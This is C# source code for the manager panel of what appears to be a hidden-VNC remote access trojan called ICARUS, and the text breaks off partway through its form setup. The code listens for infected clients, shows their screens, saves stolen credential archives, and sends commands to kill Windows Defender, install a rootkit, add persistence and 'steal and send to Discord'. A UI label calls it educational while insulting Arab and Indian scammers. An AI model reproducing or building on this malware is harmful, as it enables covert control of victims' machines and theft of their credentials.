using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using System.Windows.Forms;
using BirdBrainmofo.HVNC.Properties;
using Microsoft.VisualBasic.CompilerServices;

namespace BirdBrainmofo.HVNC
{
	public class Manager : Form
	{
		private class BlueRenderer : ToolStripProfessionalRenderer
		{
			protected override void OnRenderMenuItemBackground(ToolStripItemRenderEventArgs e)
			{
				Rectangle rect = new Rectangle(Point.Empty, e.Item.Size);
				using (SolidBrush brush = new SolidBrush(e.Item.Selected ? Color.White : Color.White))
				{
					e.Graphics.FillRectangle(brush, rect);
				}
				if (!e.Item.Selected)
				{
					e.Item.ForeColor = Color.Black;
					base.OnRenderMenuItemBackground(e);
					return;
				}
				Pen pen = new Pen(Color.SteelBlue);
				SolidBrush solidBrush = new SolidBrush(Color.SteelBlue);
				e.Item.ForeColor = Color.Black;
				Rectangle rect2 = new Rectangle(Point.Empty, e.Item.Size);
				e.Graphics.FillRectangle(solidBrush, rect2);
				e.Graphics.DrawRectangle(pen, 0, 0, rect2.Width, rect2.Height);
				pen.Dispose();
				solidBrush.Dispose();
			}
		}

		//[CompilerGenerated]
		//private sealed class _003C_003Ec__DisplayClass19_0
		//{
		//	public Manager _003C_003E4__this;

		//	public TcpClient tcpClient;

		//	public ListViewItem lvi;

		//	public _003C_003Ec__DisplayClass19_0()
		//	{
		//		throw /*Error near IL_0001: Stack underflow*/;
		//	}

		//	internal void _003CReadResult_003Eb__0()
		//	{
		//		checked
		//		{
		//			lock (Manager._clientList)
		//			{
		//				this._003C_003E4__this.ClientsList.Items.Add(this.lvi);
		//				this._003C_003E4__this.ClientsList.Items[Manager.int_2].Selected = true;
		//				Manager._clientList.Add(this.tcpClient);
		//				Manager.int_2++;
		//				this._003C_003E4__this.Text = Class2.smethod_15(2103436) + Conversions.ToString(Manager.int_2);
		//			}
		//		}
		//	}
		//}

		

		private ListViewItem lvHoveredItem;

		public static List<TcpClient> _clientList;

		public static TcpListener _TcpListener;

		private Thread VNC_Thread;

		public static int SelectClient;

		private int int_0;

		private bool bool_1;

		private bool bool_2;

		public MoveBytes MoveBytes0;

		public TGtoDSC TGDC0;

		public static int int_2;

		public static Random random;

		public int count;

		public TGtoDSC ST_0;

		private IContainer components;

		private ColumnHeader columnHeader1;

		private ColumnHeader columnHeader2;

		private ContextMenuStrip contextMenuStrip1;

		private ToolStripMenuItem buildHVNCToolStripMenuItem;

		private ColumnHeader columnHeader3;

		private ColumnHeader columnHeader4;

		private ColumnHeader columnHeader5;

		private ColumnHeader columnHeader6;

		private ColumnHeader columnHeader7;

		private ImageList imageList1;

		private ImageList imageList2;

		private ListView ClientsList;

		private PrimeTheme primeTheme1;

		private StudioButton studioButton5;

		private StudioButton studioButton4;

		private StudioButton studioButton3;

		private StudioButton studioButton1;

		private Label label_0;

		private Label label1;

		private PictureBox pictureBox1;

		private Label label3;

		private Panel panel1;

		private ToolStripMenuItem controlManagementToolStripMenuItem;

		private ToolStripMenuItem miscOptionsToolStripMenuItem;

		private ToolStripMenuItem serverControlToolStripMenuItem;

		private ToolStripMenuItem hVNCPanelToolStripMenuItem;

		private ToolStripMenuItem startupToolStripMenuItem;

		private ToolStripMenuItem taskToolStripMenuItem;

		private ToolStripMenuItem watcherToolStripMenuItem;

		private ToolStripMenuItem rootkitToolStripMenuItem;

		private ToolStripMenuItem uninstallToolStripMenuItem;

		private ToolStripMenuItem restartToolStripMenuItem;

		private ToolStripMenuItem resetSizeToolStripMenuItem;

		private ToolStripMenuItem killWindowsDefenderToolStripMenuItem;

		private JCS.ToggleSwitch chkListen;

		private ToolStripMenuItem passwordsRecoveryToolStripMenuItem;

		private ToolTip toolTip1;

		private ToolStripMenuItem stealAndSendToDiscordToolStripMenuItem;

		public string xxhostname { get; set; }

		public string xxip { get; set; }

		public static string Results { get; internal set; }

		private void HVNCList_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		private void HVNCList_MouseLeave(object sender, EventArgs e)
		{
			if (this.lvHoveredItem != null && this.lvHoveredItem != this.ClientsList.Tag)
			{
				this.lvHoveredItem.BackColor = Color.FromArgb(54, 74, 104);
			}
			this.lvHoveredItem = null;
		}

		private void HVNCList_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Right || this.ClientsList.SelectedIndices.Count != 0)
			{
				return;
			}
			foreach (ListViewItem item in this.ClientsList.Items)
			{
				item.ForeColor = Color.Black;
				item.BackColor = Color.FromArgb(54, 74, 104);
			}
			this.ClientsList.Tag = null;
		}

		public Manager()
		{
			this.int_0 = 0;
			this.bool_1 = true;
			this.bool_2 = false;
			this.MoveBytes0 = new MoveBytes();
			this.InitializeComponent();
		}

		private void Listenning()
		{
			checked
			{
				try
				{
					Manager._clientList = new List<TcpClient>();
					Manager._TcpListener = new TcpListener(IPAddress.Any, Convert.ToInt32(Settings.Default.PORT));
					Manager._TcpListener.Start();
					Manager._TcpListener.BeginAcceptTcpClient(new AsyncCallback(ResultAsync), Manager._TcpListener);
				}
				catch (Exception ex)
				{
					try
					{
                        if (ex.Message.Contains("aborted"))
						{
                            return;
						}
						IEnumerator enumerator = null;
						while (true)
						{
							try
							{
								try
								{
									enumerator = Application.OpenForms.GetEnumerator();
									while (enumerator.MoveNext())
									{
										Form form = (Form)enumerator.Current;
                                        if (form.Name.Contains("FrmVNC"))
										{
                                            form.Dispose();
										}
									}
								}
								finally
								{
									if (enumerator is IDisposable)
									{
										(enumerator as IDisposable).Dispose();
									}
								}
							}
							catch (Exception)
							{
								continue;
							}
							break;
						}
						this.bool_1 = false;
						int num = Manager._clientList.Count - 1;
						for (int i = 0; i <= num; i++)
						{
							Manager._clientList[i].Close();
						}
						Manager._clientList = new List<TcpClient>();
						Manager.int_2 = 0;
						Manager._TcpListener.Stop();
                        Text = "{ ICARUS 1.0.0.5 } - Connections: 0";
					}
                    catch (Exception)
					{
					}
				}
			}
		}

		public static string RandomNumber(int length)
		{
            return new string((from string_0 in Enumerable.Repeat("01234567890", length)
                select string_0[random.Next(string_0.Length)]).ToArray());
        }

		public void ResultAsync(IAsyncResult iasyncResult_0)
		{
			try
			{
				TcpClient tcpClient = ((TcpListener)iasyncResult_0.AsyncState).EndAcceptTcpClient(iasyncResult_0);
				tcpClient.GetStream().BeginRead(new byte[1], 0, 0, new AsyncCallback(ReadResult), tcpClient);
				Manager._TcpListener.BeginAcceptTcpClient(new AsyncCallback(ResultAsync), Manager._TcpListener);
			}
			catch (Exception)
			{
			}
		}

        public void ReadResult(IAsyncResult iasyncResult_0)
        {
            TcpClient tcpClient = (TcpClient)iasyncResult_0.AsyncState;
            checked
            {
                try
                {
                    BinaryFormatter binaryFormatter = new BinaryFormatter();
                    binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
                    binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
                    binaryFormatter.FilterLevel = TypeFilterLevel.Full;
                    byte[] array = new byte[8];
                    int num = 8;
                    int num2 = 0;
                    while (num > 0)
                    {
                        int num3 = tcpClient.GetStream().Read(array, num2, num);
                        num -= num3;
                        num2 += num3;
                    }
                    ulong num4 = BitConverter.ToUInt64(array, 0);
                    int num5 = 0;
                    byte[] array2 = new byte[Convert.ToInt32(decimal.Subtract(new decimal(num4), 1m)) + 1];
                    using (MemoryStream memoryStream = new MemoryStream())
                    {
                        int num6 = 0;
                        int num7 = array2.Length;
                        while (num7 > 0)
                        {
                            num5 = tcpClient.GetStream().Read(array2, num6, num7);
                            num7 -= num5;
                            num6 += num5;
                        }
                        memoryStream.Write(array2, 0, (int)num4);
                        memoryStream.Position = 0L;
                        object objectValue = RuntimeHelpers.GetObjectValue(binaryFormatter.Deserialize(memoryStream));
                        if (objectValue is string)
                        {
                            string[] array3 = (string[])NewLateBinding.LateGet(objectValue, null, "split", new object[1] { "|" }, null, null, null);
                            try
                            {
                                if (Operators.CompareString(array3[0], "54321", TextCompare: false) == 0)
                                {
                                    string text;
                                    try
                                    {
                                        text = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString();
                                    }
                                    catch
                                    {
                                        text = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString();
                                    }
                                    ListViewItem lvi = new ListViewItem(new string[7]
                                    {
                                        " " + array3[1].Replace(" ", null) + "88935",
                                        text,
                                        array3[2],
                                        array3[3],
                                        array3[4],
                                        array3[5],
                                        array3[6]
                                    })
                                    {
                                        Tag = tcpClient,
                                        ImageKey = array3[3] + ".png"
                                    };
                                    ClientsList.Invoke((MethodInvoker)delegate
                                    {
                                        lock (_clientList)
                                        {
                                            ClientsList.Items.Add(lvi);
                                            ClientsList.Items[int_2].Selected = true;
                                            _clientList.Add(tcpClient);
                                            int_2++;
                                            Text = "{ ICARUS 1.0.0.5 } - Connections: " + Conversions.ToString(int_2);
                                        }
                                    });
                                }
                                else if (_clientList.Contains(tcpClient))
                                {
                                    GetStatus(RuntimeHelpers.GetObjectValue(objectValue), tcpClient);
                                }
                                else
                                {
                                    tcpClient.Close();
                                }
                            }
                            catch (Exception)
                            {
                            }
                        }
                        else if (_clientList.Contains(tcpClient))
                        {
                            GetStatus(RuntimeHelpers.GetObjectValue(objectValue), tcpClient);
                        }
                        else
                        {
                            tcpClient.Close();
                        }
                        memoryStream.Close();
                        memoryStream.Dispose();
                    }
                    tcpClient.GetStream().BeginRead(new byte[1], 0, 0, ReadResult, tcpClient);
                }
                catch (Exception ex2)
                {
                    if (!ex2.Message.Contains("disposed"))
                    {
                        try
                        {
                            if (_clientList.Contains(tcpClient))
                            {
                                int NumberReceived;
                                for (NumberReceived = Application.OpenForms.Count - 2; NumberReceived >= 0; NumberReceived += -1)
                                {
                                    if (Application.OpenForms[NumberReceived] != null && Application.OpenForms[NumberReceived].Tag == tcpClient)
                                    {
                                        if (Application.OpenForms[NumberReceived].Visible)
                                        {
                                            Invoke((MethodInvoker)delegate
                                            {
                                                if (Application.OpenForms[NumberReceived].IsHandleCreated)
                                                {
                                                    Application.OpenForms[NumberReceived].Close();
                                                }
                                            });
                                        }
                                        else if (Application.OpenForms[NumberReceived].IsHandleCreated)
                                        {
                                            Application.OpenForms[NumberReceived].Close();
                                        }
                                    }
                                }
                                lock (_clientList)
                                {
                                    try
                                    {
                                        int index = _clientList.IndexOf(tcpClient);
                                        _clientList.RemoveAt(index);
                                        ClientsList.Items.RemoveAt(index);
                                        tcpClient.Close();
                                        int_2--;
                                        Text = "{ ICARUS 1.0.0.5 } - Connections: " + Conversions.ToString(int_2);
                                        return;
                                    }
                                    catch (Exception)
                                    {
                                        return;
                                    }
                                }
                            }
                            return;
                        }
                        catch (Exception)
                        {
                            return;
                        }
                    }
                    tcpClient.Close();
                }
            }
        }

        public void GetStatus(object object_2, TcpClient tcpClient_0)
        {
            int hashCode = tcpClient_0.GetHashCode();
            hVNC hVNC2 = (hVNC)Application.OpenForms["VNCForm:" + Conversions.ToString(hashCode)];
            if (object_2 is Bitmap)
            {
                hVNC2.VNCBoxe.Image = (Image)object_2;
            }
            else
            {
                if (!(object_2 is string))
                {
                    return;
                }
                string[] dataReceive = Conversions.ToString(object_2).Split('|');
                string left = dataReceive[0];
                if (Operators.CompareString(left, "0", TextCompare: false) == 0)
                {
                    hVNC2.VNCBoxe.Tag = new Size(Conversions.ToInteger(dataReceive[1]), Conversions.ToInteger(dataReceive[2]));
                }
                if (Operators.CompareString(left, "9", TextCompare: false) != 0)
                {
                    Invoke((MethodInvoker)delegate
                    {
                        try
                        {
                            Clipboard.SetText(dataReceive[1]);
                        }
                        catch (Exception)
                        {
                        }
                    });
                }
                if (!Directory.Exists(Directory.GetCurrentDirectory() + "\\Recovery"))
                {
                    Directory.CreateDirectory("Recovery");
                }
                Results = dataReceive[1];
                if (!Results.Contains("System"))
                {
                    File.WriteAllBytes(Directory.GetCurrentDirectory() + "\\Recovery\\sszQwCZGRo_Recovery.zip", Convert.FromBase64String(Results));
                }
                GC.Collect();
            }
        }

        public static string RandomMutex(int length)
		{
            return new string((from string_0 in Enumerable.Repeat("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz", length)
                select string_0[random.Next(string_0.Length)]).ToArray());
        }

		private void HVNCList_DoubleClick(object sender, EventArgs e)
		{
			if (this.ClientsList.FocusedItem.Index == -1)
			{
				return;
			}
			checked
			{
				for (int i = Application.OpenForms.Count - 1; i >= 0; i += -1)
				{
					if (Application.OpenForms[i].Tag == Manager._clientList[this.ClientsList.FocusedItem.Index])
					{
						Application.OpenForms[i].Show();
						return;
					}
				}
				hVNC obj = new hVNC();
                obj.Name = "VNCForm:" + Conversions.ToString(_clientList[ClientsList.FocusedItem.Index].GetHashCode());
				obj.Tag = Manager._clientList[this.ClientsList.FocusedItem.Index];
                obj.Text = ClientsList.FocusedItem.SubItems[2].ToString().Replace("ListViewSubItem", "{ ICARUS 1.0.0.5 } - Connected to:");
				obj.Show();
			}
		}

		private void HVNCListenBtn_Click_1(object sender, EventArgs e)
		{
		}

		private void buildHVNCToolStripMenuItem_Click(object sender, EventArgs e)
		{
			new StubBuilder(Settings.Default.PORT).ShowDialog();
		}

		private void Form1_FormClosing(object sender, FormClosingEventArgs e)
		{
			Environment.Exit(0);
		}

		private void SetLastColumnWidth()
		{
			this.ClientsList.Columns[this.ClientsList.Columns.Count - 1].Width = -2;
		}

		private void FrmMain_Load(object sender, EventArgs e)
		{
			this.contextMenuStrip1.Renderer = new BlueRenderer();
			this.SetLastColumnWidth();
			this.ClientsList.Layout += delegate
			{
				this.SetLastColumnWidth();
			};
			this.ClientsList.View = View.Details;
			this.ClientsList.HideSelection = false;
			this.ClientsList.OwnerDraw = true;
			this.ClientsList.GridLines = false;
			this.ClientsList.BackColor = Color.FromArgb(226, 226, 226);
			this.ClientsList.DrawColumnHeader += delegate(object sender, DrawListViewColumnHeaderEventArgs e)
			{
				SolidBrush brush = new SolidBrush(Color.White);
				e.Graphics.FillRectangle(brush, e.Bounds);
				TextRenderer.DrawText(e.Graphics, e.Header.Text, e.Font, e.Bounds, Color.Black);
			};
			this.ClientsList.DrawItem += delegate(object sender, DrawListViewItemEventArgs e)
			{
				e.DrawDefault = true;
			};
			this.ClientsList.DrawSubItem += delegate(object sender, DrawListViewSubItemEventArgs e)
			{
				e.DrawDefault = true;
			};
			if (Settings.Default.PORT.Length == 0)
			{
				using (Listener listener = new Listener())
				{
					listener.ShowDialog();
					return;
				}
			}
			this.chkListen.Checked = true;
		}

		private void listenning1_TextChanged(object sender, EventArgs e)
		{
		}

		private void HVNCListenPort_TextChanged(object sender, EventArgs e)
		{
		}

		private void studioButton5_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		private void hVNCPanelToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsList.FocusedItem.Index == -1)
			{
				return;
			}
			checked
			{
				for (int i = Application.OpenForms.Count - 1; i >= 0; i += -1)
				{
					if (Application.OpenForms[i].Tag == Manager._clientList[this.ClientsList.FocusedItem.Index])
					{
						Application.OpenForms[i].Show();
						return;
					}
				}
                hVNC obj = new hVNC();
                obj.Name = "VNCForm:" + Conversions.ToString(_clientList[ClientsList.FocusedItem.Index].GetHashCode());
                obj.Tag = _clientList[ClientsList.FocusedItem.Index];
                obj.Text = ClientsList.FocusedItem.SubItems[2].ToString().Replace("ListViewSubItem", "{ ICARUS 1.0.0.5 } - Connected to:");
                obj.Show();
            }
		}

		private void studioButton4_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Maximized;
		}

		private void studioButton3_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Normal;
		}

		private void studioButton1_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Minimized;
		}

		private void watcherToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsList.SelectedItems.Count == 0)
			{
                MessageBox.Show("Please select a client first! ", "ICARUS");
				return;
			}
			foreach (object selectedItem in this.ClientsList.SelectedItems)
			{
				_ = selectedItem;
				this.count = this.ClientsList.SelectedItems.Count;
			}
			int num = default(int);
			do
			{
				object tag = this.ClientsList.SelectedItems[num].Tag;
				this.ClientsList.SelectedItems[num].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                    .Replace("}", null)
                    .Replace(":", null)
					.Remove(0, 1);
				this.ClientsList.SelectedItems[num].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                    .Replace("}", null)
                    .Replace(":", null)
                    .Remove(0, 1);
                SendTCP("1008* ", (TcpClient)tag);
				num++;
			}
			while (num < this.count);
		}

		private void startupToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsList.SelectedItems.Count == 0)
			{
                MessageBox.Show("Please select a client first! ", "ICARUS");
				return;
			}
			foreach (object selectedItem in this.ClientsList.SelectedItems)
			{
				_ = selectedItem;
				this.count = this.ClientsList.SelectedItems.Count;
			}
			int num = default(int);
			do
			{
				object tag = this.ClientsList.SelectedItems[num].Tag;
				this.ClientsList.SelectedItems[num].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                    .Replace("}", null)
                    .Replace(":", null)
                    .Remove(0, 1);
				this.ClientsList.SelectedItems[num].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                    .Replace("}", null)
                    .Replace(":", null)
                    .Remove(0, 1);
                SendTCP("8890* ", (TcpClient)tag);
				num++;
			}
			while (num < this.count);
		}

		private void SendTCP(object object_0, TcpClient tcpClient_1)
		{
			checked
			{
				try
				{
					lock (tcpClient_1)
					{
						BinaryFormatter binaryFormatter = new BinaryFormatter();
						binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
						binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
						binaryFormatter.FilterLevel = TypeFilterLevel.Full;
						object objectValue = RuntimeHelpers.GetObjectValue(object_0);
						MemoryStream memoryStream = new MemoryStream();
						binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(objectValue));
						ulong num = (ulong)memoryStream.Position;
						tcpClient_1.GetStream().Write(BitConverter.GetBytes(num), 0, 8);
						byte[] buffer = memoryStream.GetBuffer();
						tcpClient_1.GetStream().Write(buffer, 0, (int)num);
						memoryStream.Close();
						memoryStream.Dispose();
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}

		private void taskToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsList.SelectedItems.Count == 0)
			{
                MessageBox.Show("Please select a client first! ", "ICARUS");
				return;
			}
			foreach (object selectedItem in this.ClientsList.SelectedItems)
			{
				_ = selectedItem;
				this.count = this.ClientsList.SelectedItems.Count;
			}
			int num = default(int);
			do
			{
				object tag = this.ClientsList.SelectedItems[num].Tag;
				this.ClientsList.SelectedItems[num].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                    .Replace("}", null)
                    .Replace(":", null)
                    .Remove(0, 1);
				this.ClientsList.SelectedItems[num].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
                    .Replace("}", null)
                    .Replace(":", null)
                    .Remove(0, 1);
                SendTCP("8891* ", (TcpClient)tag);
				num++;
			}
			while (num < this.count);
		}

		private void uninstallToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsList.SelectedItems.Count == 0)
			{
				                MessageBox.Show("Please select a client first! ", "ICARUS");
				return;
			}
			foreach (object selectedItem in this.ClientsList.SelectedItems)
			{
				_ = selectedItem;
				this.count = this.ClientsList.SelectedItems.Count;
			}
			int num = default(int);
			do
			{
				object tag = this.ClientsList.SelectedItems[num].Tag;
				this.ClientsList.SelectedItems[num].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				this.ClientsList.SelectedItems[num].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
                SendTCP("8889* ", (TcpClient)tag);
                if (MessageBox.Show("Are you sure ? " + Environment.NewLine + Environment.NewLine + "You lose the connection !", "Close Connexion ?", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
                {
                    SendTCP("24*", (TcpClient)tag);
                    SendTCP("8889* ", (TcpClient)tag);
                    continue;
                }
                break;
			}
			while (num < this.count);
		}

		private void rootkitToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsList.SelectedItems.Count == 0)
			{
				                MessageBox.Show("Please select a client first! ", "ICARUS");
				return;
			}
			foreach (object selectedItem in this.ClientsList.SelectedItems)
			{
				_ = selectedItem;
				this.count = this.ClientsList.SelectedItems.Count;
			}
			int num = default(int);
			do
			{
				object tag = this.ClientsList.SelectedItems[num].Tag;
				this.ClientsList.SelectedItems[num].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				this.ClientsList.SelectedItems[num].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
                SendTCP("2010* ", (TcpClient)tag);
				num++;
			}
			while (num < this.count);
		}

		private void resetSizeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			hVNC hVNC2 = new hVNC();
			foreach (object selectedItem in this.ClientsList.SelectedItems)
			{
				_ = selectedItem;
				this.count = this.ClientsList.SelectedItems.Count;
			}
			int num = default(int);
			do
			{
				hVNC2.Name = "VNCForm:" + Conversions.ToString(this.ClientsList.SelectedItems[num].GetHashCode());
				hVNC2.Tag = this.ClientsList.SelectedItems[num].Tag;
				hVNC2.ResetScale();
				hVNC2.Dispose();
				num++;
			}
			while (num < this.count);
		}

		private void passwordsRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
		{
		}

		private void killWindowsDefenderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsList.SelectedItems.Count == 0)
			{
				                MessageBox.Show("Please select a client first! ", "ICARUS");
				return;
			}
			foreach (object selectedItem in this.ClientsList.SelectedItems)
			{
				_ = selectedItem;
				this.count = this.ClientsList.SelectedItems.Count;
			}
			int num = default(int);
			do
			{
				object tag = this.ClientsList.SelectedItems[num].Tag;
				this.ClientsList.SelectedItems[num].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				this.ClientsList.SelectedItems[num].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
                SendTCP("2011* ", (TcpClient)tag);
				num++;
			}
			while (num < this.count);
		}

		private void chkListen_CheckedChanged(object sender, EventArgs e)
		{
			checked
			{
                if (label_0.Text.Contains("Disabled"))
				{
                    this.buildHVNCToolStripMenuItem.Enabled = true;
					this.VNC_Thread = new Thread(new ThreadStart(Listenning))
					{
						IsBackground = true
					};
					this.bool_1 = true;
					this.VNC_Thread.Start();
					this.label_0.Text = "Activated on:" + Settings.Default.PORT + @"    NOTE: NOT FOR COMMERCIALIZATION PURPOSES BY 5$ MORONS(ESPECIALLY ARAB AND INDIAN SCAMMERS)ONLY FOR EDUCATIONAL PURPOSES";
                }
				else
				{
                    if (!label_0.Text.Contains("Activated"))
					{
                        return;
					}
					IEnumerator enumerator = null;
					while (true)
					{
						try
						{
							try
							{
								enumerator = Application.OpenForms.GetEnumerator();
								while (enumerator.MoveNext())
								{
									Form form = (Form)enumerator.Current;
                                    if (form.Name.Contains("FrmVNC"))
									{
                                        form.Dispose();
									}
								}
							}
							finally
							{
								if (enumerator is IDisposable)
								{
									(enumerator as IDisposable).Dispose();
								}
							}
						}
						catch (Exception)
						{
							continue;
						}
						break;
					}
					this.VNC_Thread.Abort();
					this.bool_1 = false;
                    label_0.Text = @"Disabled";
					this.buildHVNCToolStripMenuItem.Enabled = false;
					this.ClientsList.Items.Clear();
					Manager._TcpListener.Stop();
					int num = Manager._clientList.Count - 1;
					for (int i = 0; i <= num; i++)
					{
						Manager._clientList[i].Close();
					}
					Manager._clientList = new List<TcpClient>();
					Manager.int_2 = 0;
                    Text = "{ ICARUS 1.0.0.5 } - Connections: 0";
				}
            }
		}

		private void passwordsRecoveryToolStripMenuItem_Click_1(object sender, EventArgs e)
		{
			if (this.ST_0.IsDisposed)
			{
				this.ST_0 = new TGtoDSC();
			}
			this.ST_0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
            ST_0.Text = Text.Replace("{ ICARUS 1.0.0.5 - Connected: Admin } - ", null);
			this.ST_0.Show();
		}

		private void stealAndSendToDiscordToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ST_0.IsDisposed)
			{
				this.ST_0 = new TGtoDSC();
			}
			this.ST_0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
            ST_0.Text = Text.Replace("{ ICARUS 1.0.0.5 - Connected: Admin } - ", null);
			this.ST_0.Show();
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			this.components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(HVNC.Manager));
			BloomBrain bloom = new BloomBrain();
			BloomBrain bloom2 = new BloomBrain();
			BloomBrain bloom3 = new BloomBrain();
			BloomBrain bloom4 = new BloomBrain();
			BloomBrain bloom5 = new BloomBrain();
			BloomBrain bloom6 = new BloomBrain();
			BloomBrain bloom7 = new BloomBrain();
			BloomBrain bloom8 = new BloomBrain();
			BloomBrain bloom9 = new BloomBrain();
			BloomBrain bloom10 = new BloomBrain();
			BloomBrain bloom11 = new BloomBrain();
			BloomBrain bloom12 = new BloomBrain();
			BloomBrain bloom13 = new BloomBrain();
			BloomBrain bloom14 = new BloomBrain();
			BloomBrain bloom15 = new BloomBrain();
			BloomBrain bloom16 = new BloomBrain();
			BloomBrain bloom17 = new BloomBrain();
			BloomBrain bloom18 = new BloomBrain();
			BloomBrain bloom19 = new BloomBrain();
			BloomBrain bloom20 = new BloomBrain();
			BloomBrain bloom21 = new BloomBrain();
			BloomBrain bloom22 = new BloomBrain();
			BloomBrain bloom23 = new BloomBrain();
			BloomBrain bloom24 = new BloomBrain();
			BloomBrain bloom25 = new BloomBrain();
			BloomBrain bloom26 = new BloomBrain();
			BloomBrain bloom27 = new BloomBrain();
			BloomBrain bloom28 = new BloomBrain();
			BloomBrain bloom29 = new BloomBrain();
			BloomBrain bloom30 = new BloomBrain();
			BloomBrain bloom31 = new BloomBrain();
			BloomBrain bloom32 = new BloomBrain();
			BloomBrain bloom33 = new BloomBrain();
			BloomBrain bloom34 = new BloomBrain();
			BloomBrain bloom35 = new BloomBrain();
			BloomBrain bloom36 = new BloomBrain();
			BloomBrain bloom37 = new BloomBrain();
			BloomBrain bloom38 = new BloomBrain();
			BloomBrain bloom39 = new BloomBrain();
			BloomBrain bloom40 = new BloomBrain();
			BloomBrain bloom41 = new BloomBrain();
			BloomBrain bloom42 = new BloomBrain();
			BloomBrain bloom43 = new BloomBrain();
			BloomBrain bloom44 = new BloomBrain();
			BloomBrain bloom45 = new BloomBrain();
			BloomBrain bloom46 = new BloomBrain();
			BloomBrain bloom47 = new BloomBrain();
			BloomBrain bloom48 = new BloomBrain();
			BloomBrain bloom49 = new BloomBrain();
			BloomBrain bloom50 = new BloomBrain();
			BloomBrain bloom51 = new BloomBrain();
			BloomBrain bloom52 = new BloomBrain();
			BloomBrain bloom53 = new BloomBrain();
			BloomBrain bloom54 = new BloomBrain();
			BloomBrain bloom55 = new BloomBrain();
			BloomBrain bloom56 = new BloomBrain();
			BloomBrain bloom57 = new BloomBrain();
			BloomBrain bloom58 = new BloomBrain();
			BloomBrain bloom59 = new BloomBrain();
			BloomBrain bloom60 = new BloomBrain();
			BloomBrain bloom61 = new BloomBrain();
			BloomBrain bloom62 = new BloomBrain();
			this.imageList1 = new System.Windows.Forms.ImageList(this.components);
			this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
			this.controlManagementToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.startupToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.taskToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.miscOptionsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.watcherToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.rootkitToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.killWindowsDefenderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.passwordsRecoveryToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.stealAndSendToDiscordToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.serverControlToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.uninstallToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.restartToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.resetSizeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.hVNCPanelToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.buildHVNCToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
			this.imageList2 = new System.Windows.Forms.ImageList(this.components);
			this.primeTheme1 = new PrimeTheme();
			this.label3 = new System.Windows.Forms.Label();
